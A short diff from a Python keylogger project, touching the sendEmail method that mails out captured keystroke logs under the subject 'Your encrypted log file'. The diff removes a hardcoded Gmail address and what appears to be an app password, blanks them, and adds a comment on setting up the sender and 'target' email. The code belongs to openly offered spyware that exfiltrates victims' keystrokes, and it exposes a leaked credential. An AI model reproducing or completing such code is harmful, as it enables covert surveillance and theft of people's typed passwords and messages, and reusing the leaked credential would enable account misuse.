@@ -120,11 +120,13 @@ class KeyLogger():
         @Return: None
     '''
     def sendEmail(self):
-        sender = "ofingy101@gmail.com"
+        # Enter your email and target email. The secret variable is the password for third party applications
+        # to access your email which you will need to enable and will receive a special code.
+        sender = "" 
 
-        secret = "bqbdrxoeupkiasab"
+        secret = ""
 
-        reciever = "ofingy101@gmail.com"
+        reciever = ""
 
 
         subject = "Your encrypted log file"
